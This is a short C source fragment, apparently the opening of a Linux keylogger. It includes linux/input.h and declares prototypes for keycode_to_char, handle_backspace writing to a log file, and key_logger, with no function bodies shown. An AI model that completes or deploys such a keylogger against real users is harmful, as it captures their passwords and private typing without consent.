#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char keycode_to_char (int code, int shift);
void handle_backspace (FILE *log);
int key_logger ( );
